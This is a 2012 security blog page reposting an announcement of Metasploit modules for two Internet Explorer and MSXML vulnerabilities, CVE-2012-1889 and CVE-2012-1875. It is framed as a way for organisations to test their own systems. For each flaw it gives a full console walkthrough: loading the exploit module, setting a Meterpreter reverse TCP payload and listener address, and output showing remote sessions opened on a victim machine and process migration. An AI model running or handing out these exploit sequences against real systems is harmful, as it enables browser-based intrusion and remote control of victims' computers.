<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Metasploit中添加了最新的IE-0day Exp CVE-2012-1889 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-06-22T04:07:05.000Z" itemprop="datePublished">
          2012-06-22
      </time>
    
    
    | 
    <a href='/tag/暴雷/'>暴雷</a>,
    
    <a href='/tag/hijacking/'>hijacking</a>
    
    
</span>
    <h1 class="post-title">Metasploit中添加了最新的IE-0day Exp CVE-2012-1889</h1>
    <section class="post-content">
      <p>We’ve been noticing a lot of exploit activities against Microsoft vulnerabilities lately. We decided to look into some of these attacks, and released two modules for CVE-2012-1889 and CVE-2012-1875 within a week of the vulnerabilities’ publication for our users to test their systems. Please note that both are very important to any organization using Windows, because one of them is a newly patched bug, while the other is still a zero-day. To test if any systems on your network are vulnerable, you can download the latest version of Metasploit for free. </p>  <p>CVE-2012-1889: MSXML Uninitialized Memory Corruption </p>  <p>This is an uninitialized memory bug found in MSXML. According to Microsoft, such a component can be loaded from either Internet Explorer and Microsoft Office. This vulnerability is rumored to be &quot;state-sponsored&quot;, and what makes it really critical is it’s still an 0-day <a href="http://ha.cker.in/tag/hijacking" target="_blank">hijacking</a> Gmail accounts. That’s right, that means if you’re using Gmail as well as Internet Explorer or Microsoft Office, you’re at risk. We expect this vulnerability to grow even more dangerous since there’s no patch, and it’s rather easy to trigger. There is a temporary mitigation from Microsoft by disabling the component and other config tweaks, but obviously, that has its limitations. Your best bet may be to use a different browser such as Google Chrome until an official patch is available. </p>  <p>Here’s how you can check with Metasploit if any systems on your network are vulnerable, which is very likely since there is no patch available yet:   <br>msf &gt; use exploit/windows/browser/msxml_get_definition_code_exec    <br>msf&#160; exploit(msxml_get_definition_code_exec) &gt; set payload windows/meterpreter/reverse_tcp    <br>payload =&gt; windows/meterpreter/reverse_tcp    <br>msf&#160; exploit(msxml_get_definition_code_exec) &gt; set lhost 10.0.1.3    <br>lhost =&gt; 10.0.1.3    <br>msf&#160; exploit(msxml_get_definition_code_exec) &gt; exploit    <br>Exploit running as background job.    <br>Started reverse handler on 10.0.1.3:4444    <br>Using URL: <a href="http://0.0.0.0:8080/xtQdbEC7QDIb" target="_blank" rel="external">http://0.0.0.0:8080/xtQdbEC7QDIb</a>    <br>msf&#160; exploit(msxml_get_definition_code_exec) &gt;    <br>&#160; Local IP: <a href="http://10.0.1.3:8080/xtQdbEC7QDIb" target="_blank" rel="external">http://10.0.1.3:8080/xtQdbEC7QDIb</a>    <br>Server started.    <br>10.0.1.79&#160;&#160;&#160;&#160;&#160;&#160;&#160; msxml_get_definition_code_exec - Using msvcrt ROP    <br>10.0.1.79&#160;&#160;&#160;&#160;&#160;&#160;&#160; msxml_get_definition_code_exec - 10.0.1.79:1564 - Sending html    <br>Sending stage (752128 bytes) to 10.0.1.79    <br>Meterpreter session 2 opened (10.0.1.3:4444 -&gt; 10.0.1.79:1565) at 2012-06-18 14:07:38 -0500    <br>Session ID 2 (10.0.1.3:4444 -&gt; 10.0.1.79:1565) processing InitialAutoRunScript ‘migrate -f’    <br>Current server process: iexplore.exe (2856)    <br>Spawning notepad.exe process to migrate to    <br>[+] Migrating to 2356    <br>[+] Successfully migrated to process </p>  <p>CVE-2012-1875: Internet Explorer Same ID Use-After-Free </p>  <p>This is a vulnerability found in the way Internet Explorer handles the same ID property, which accesses a deleted object and results in remote code execution. This has been exploited in the wild, possibly originating from Hong Kong. According to AlienVault Labs, the command-and-control server (C&amp;C) is still active at the time of this writing. The Metasploit module shares some similarities with the one found in the wild – they both bypass DEP/ASLR, use msvcr71.dll, and they both target common systems such as Windows XP and Windows 7. Multiple anti-virus vendors already have a quick check for this exploit. However, AVs cannot be used to patch bugs, so we still recommend you to try the Metasploit module anyway to verify if you are still indeed vulnerable. </p>  <p>To use this module, simply do the following:   <br>msf &gt; use exploit/windows/browser/ms12_037_same_id    <br>msf&#160; exploit(ms12_037_same_id) &gt; set payload windows/meterpreter/reverse_tcp    <br>payload =&gt; windows/meterpreter/reverse_tcp    <br>msf&#160; exploit(ms12_037_same_id) &gt; set lhost 10.0.1.3    <br>lhost =&gt; 10.0.1.3    <br>msf&#160; exploit(ms12_037_same_id) &gt; exploit    <br>Exploit running as background job.    <br>Started reverse handler on 10.0.1.3:4444    <br>Using URL: <a href="http://0.0.0.0:8080/gTHJEKBboMi" target="_blank" rel="external">http://0.0.0.0:8080/gTHJEKBboMi</a>    <br>&#160; Local IP: <a href="http://10.0.1.3:8080/gTHJEKBboMi" target="_blank" rel="external">http://10.0.1.3:8080/gTHJEKBboMi</a>    <br>Server started.    <br>msf&#160; exploit(ms12_037_same_id) &gt;    <br>10.0.1.79&#160;&#160;&#160;&#160;&#160;&#160;&#160; ms12_037_same_id - Client requesting: /gTHJEKBboMi    <br>10.0.1.79&#160;&#160;&#160;&#160;&#160;&#160;&#160; ms12_037_same_id - Using msvcrt ROP    <br>10.0.1.79&#160;&#160;&#160;&#160;&#160;&#160;&#160; ms12_037_same_id - Sending html    <br>Sending stage (752128 bytes) to 10.0.1.79    <br>Meterpreter session 1 opened (10.0.1.3:4444 -&gt; 10.0.1.79:1685) at 2012-06-18 13:42:49 -0500    <br>Session ID 1 (10.0.1.3:4444 -&gt; 10.0.1.79:1685) processing InitialAutoRunScript ‘migrate -f’    <br>Current server process: iexplore.exe (3916)    <br>Spawning notepad.exe process to migrate to    <br>[+] Migrating to 1680    <br>[+] Successfully migrated to process </p>  <p>If you have any questions, let us know in the comments section.&#160; To obtain the latest version of Metasploit for free, please go to: <a href="http://www" target="_blank" rel="external">http://www</a>.<a href="http://ha.cker.in/tag/Metasploit" target="_blank">metasploit</a>.com/download/</p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/591.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/591.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/591.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/591.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/593.seo/">
        ← RedHat替换CentOS的源和汉化
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/589.seo/">
        jboss蠕虫病毒清理-kisses.tar.gz →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
